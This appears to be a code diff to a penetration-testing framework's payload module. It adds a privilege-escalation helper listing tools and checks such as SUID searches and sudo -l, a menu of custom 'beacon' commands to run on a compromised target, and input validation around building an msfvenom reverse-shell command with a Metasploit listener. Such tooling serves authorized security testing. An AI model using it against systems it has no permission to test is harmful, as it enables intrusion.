@@ -3,6 +3,7 @@ import socket
 from phantom.modules.base_module import BaseModule
 from phantom.core.executor import run_command
 from phantom.core.session import session
+from phantom.utils.notifier import notifier
 from rich.console import Console
 
 console = Console()
@@ -35,7 +36,8 @@ def _detect_os_from_xml(target: str) -> str:
     Read OS detection results from the Nmap XML saved during scan.
     Returns a human-readable OS string, or empty string if not found.
     """
-    xml_path = f"data/sessions/scan_{target}.xml"
+    from phantom.utils.paths import scan_xml_path
+    xml_path = scan_xml_path(target)
     if not os.path.exists(xml_path):
         return ""
 
@@ -95,14 +97,41 @@ def _os_to_payload_hint(os_string: str) -> tuple:
 class PayloadModule(BaseModule):
     module_name = "payload"
 
+    def build_commands(self) -> dict:
+        return {
+            "CORE": ["generate", "privesc"],
+            "LISTENER": ["handler <port> <payload>"]
+        }
+
+    def do_privesc(self, _):
+        """privesc — List suggested Privilege Escalation tools and techniques for the target."""
+        os_string, arch, platform = self._guess_os()
+        
+        console.print(f"\n[bold yellow]--- Privilege Escalation Assistant ({platform.capitalize()} {arch}) ---[/]")
+        
+        if platform == "windows":
+            console.print("[bold]Suggested Tools:[/]")
+            console.print("  - [green]WinPEAS[/]: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS")
+            console.print("  - [green]PrivescCheck[/]: https://github.com/itm4n/PrivescCheck")
+            console.print("  - [green]Seatbelt[/]: https://github.com/GhostPack/Seatbelt")
+            console.print("\n[bold]Suggested Techniques:[/]")
+            console.print("  - Check for Unquoted Service Paths")
+            console.print("  - Check for AlwaysInstallElevated registry key")
+            console.print("  - Check for Token Impersonation (SeImpersonatePrivilege)")
+        else:
+            console.print("[bold]Suggested Tools:[/]")
+            console.print("  - [green]LinPEAS[/]: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS")
+            console.print("  - [green]Linux Smart Enumeration (lse.sh)[/]: https://github.com/diego-treitos/linux-smart-enumeration")
+            console.print("  - [green]linux-exploit-suggester[/]: https://github.com/The-Z-Old-GitHub-Repo-of-Linux-Exploit-Suggester/linux-exploit-suggester")
+            console.print("\n[bold]Suggested Techniques:[/]")
+            console.print("  - Check for SUID binaries (`find / -perm -u=s -type f 2>/dev/null`) ")
+            console.print("  - Check for writable /etc/passwd or /etc/shadow")
+            console.print("  - Check sudo permissions (`sudo -l`)")
+
     def _get_lhost(self) -> str:
         """Auto-detect local IP (VPN/tun0 or default route)."""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            return s.getsockname()[0]
-        except Exception:
-            return "127.0.0.1"
+        from phantom.utils.network import get_lhost
+        return get_lhost()
 
     def _guess_os(self) -> tuple:
         """
@@ -156,20 +185,57 @@ class PayloadModule(BaseModule):
         os_string, arch, platform = self._guess_os()
         lhost = self._get_lhost()
 
-        console.print("[green][+] Auto-detected from scan results:[/]")
-        console.print(f"    OS:      [cyan]{os_string}[/]")
-        console.print(f"    Arch:    [cyan]{arch}[/]")
-        console.print(f"    LHOST:   [cyan]{lhost}[/]")
-        console.print(f"    Target:  [cyan]{session.target or 'not set'}[/]\n")
+        notifier.info(f"Auto-detected Target OS: {os_string} ({arch})")
+        notifier.info(f"LHOST: {lhost}")
+        notifier.info(f"Target: {session.target or 'not set'}")
+        console.print()
+
+        # Payload types (include custom)
+        from phantom.utils.payload_manager import get_custom_beacons
+        custom_beacons = get_custom_beacons()
+        
+        all_payloads = PAYLOAD_TYPES.copy()
+        
+        # Add custom beacons as entries 9, 10, ...
+        custom_mapping = {}
+        for i, beacon in enumerate(custom_beacons, start=9):
+            all_payloads[str(i)] = (beacon["command"], f"{beacon['description']} ({beacon['platform']})")
+            custom_mapping[str(i)] = beacon
 
         # Payload type
         suggested_payload = self._suggest_payload(arch, platform)
-        for k, (_, desc) in PAYLOAD_TYPES.items():
+        for k, (_, desc) in all_payloads.items():
             marker = " [dim](suggested)[/]" if k == suggested_payload else ""
             console.print(f"  [{k}] {desc}{marker}")
 
-        payload_choice = input(f"\n  Payload type [{suggested_payload}]: ").strip() or suggested_payload
-        payload_str, payload_desc = PAYLOAD_TYPES.get(payload_choice, PAYLOAD_TYPES[suggested_payload])
+        while True:
+            payload_choice = input(f"\n  Payload type [{suggested_payload}]: ").strip() or suggested_payload
+            
+            # Allow exit commands
+            if payload_choice.lower() in ["back", "exit", "quit", "q"]:
+                notifier.warn("Cancelled payload generation.")
+                return
+            
+            # Validate choice
+            if payload_choice in all_payloads or payload_choice in custom_mapping:
+                break
+            else:
+                notifier.error(f"Invalid choice '{payload_choice}'. Enter a number from the list, or 'back' to exit.")
+        
+        if payload_choice in custom_mapping:
+            beacon = custom_mapping[payload_choice]
+            cmd = beacon['command']
+
+            console.print(f"\n[bold green]Custom Beacon:[/bold green] [yellow]{beacon['description']}[/yellow]")
+            console.print(f"[bold]Deployment command (to run on target):[/bold]\n    [yellow]{cmd}[/]\n")
+
+            # Remove auto-execution because it runs LOCALLY on the pentester's machine.
+            # Instead, just provide the command and instructions.
+            notifier.info("Copy the command above and execute it on the compromised target.")
+            notifier.warn("Note: Automatic execution is disabled for security reasons (it would run locally).")
+            return
+
+        payload_str, payload_desc = all_payloads.get(payload_choice, PAYLOAD_TYPES[suggested_payload])
 
         # Output format
         suggested_fmt = self._suggest_format(platform)
@@ -178,11 +244,41 @@ class PayloadModule(BaseModule):
             marker = " [dim](suggested)[/]" if k == suggested_fmt else ""
             console.print(f"  [{k}] {desc}{marker}")
 
-        fmt_choice = input(f"\n  Output format [{suggested_fmt}]: ").strip() or suggested_fmt
+        while True:
+            fmt_choice = input(f"\n  Output format [{suggested_fmt}]: ").strip() or suggested_fmt
+            
+            if fmt_choice.lower() in ["back", "exit", "quit", "q"]:
+                notifier.warn("Cancelled payload generation.")
+                return
+            
+            if fmt_choice in FORMATS:
+                break
+            else:
+                notifier.error(f"Invalid format '{fmt_choice}'. Enter a number from the list, or 'back' to exit.")
+        
         fmt_str, fmt_desc = FORMATS.get(fmt_choice, FORMATS[suggested_fmt])
 
-        lport = input("  LPORT [4444]: ").strip() or "4444"
+        # LPORT validation
+        while True:
+            lport = input("  LPORT [4444]: ").strip() or "4444"
+            
+            if lport.lower() in ["back", "exit", "quit", "q"]:
+                notifier.warn("Cancelled payload generation.")
+                return
+            
+            try:
+                port_num = int(lport)
+                if 1 <= port_num <= 65535:
+                    break
+                else:
+                    notifier.error(f"Port must be between 1 and 65535.")
+            except ValueError:
+                notifier.error(f"Invalid port '{lport}'. Enter a number 1-65535, or 'back' to exit.")
+        
         out_file = input(f"  Output filename [shell.{fmt_str}]: ").strip() or f"shell.{fmt_str}"
+        if out_file.lower() in ["back", "exit", "quit", "q"]:
+            notifier.warn("Cancelled payload generation.")
+            return
 
         cmd = f"msfvenom -p {payload_str} LHOST={lhost} LPORT={lport} -f {fmt_str} -o {out_file}"
 
@@ -192,11 +288,21 @@ class PayloadModule(BaseModule):
         console.print("  [2] Show command only (copy manually)")
         console.print("  [3] Edit command before executing")
 
-        action = input("\n  Choice [2]: ").strip() or "2"
+        while True:
+            action = input("\n  Choice [2]: ").strip() or "2"
+            
+            if action.lower() in ["back", "exit", "quit", "q"]:
+                notifier.warn("Cancelled payload generation.")
+                return
+            
+            if action in ["1", "2", "3"]:
+                break
+            else:
+                notifier.error(f"Invalid choice '{action}'. Enter 1, 2, 3, or 'back' to exit.")
 
         if action == "1":
             run_command(cmd)
-            console.print(f"[green][+] Payload saved: {out_file}[/]")
+            notifier.success(f"Payload saved: {out_file}")
             self._start_listener(lport, payload_str)
 
         elif action == "2":
@@ -212,7 +318,7 @@ class PayloadModule(BaseModule):
     def _start_listener(self, port: str, payload: str):
         """Start Metasploit multi/handler for the generated payload."""
         from phantom.modules.handler import HandlerModule
-        console.print("[yellow][*] Starting listener...[/]")
+        notifier.status("Starting Metasploit listener...")
         HandlerModule().start_listener(port, payload)
 
     def do_run(self, _):
